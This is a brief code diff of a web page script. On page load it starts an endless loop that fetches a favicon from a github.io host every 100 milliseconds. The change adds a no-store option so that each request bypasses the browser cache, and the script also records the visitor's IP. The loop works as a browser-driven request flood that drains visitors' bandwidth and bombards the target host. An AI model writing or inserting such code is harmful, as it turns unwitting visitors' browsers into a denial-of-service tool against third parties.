@@ -19,6 +19,6 @@ var userip = (data.ip);
 window.onload = async function startdown(){
   while(true) {
     await delay(100);
-    fetch('https://t0m0t0w.github.io/favicon.png')
+    fetch('https://t0m0t0w.github.io/favicon.png', {cache: "no-store"})
   }
 }
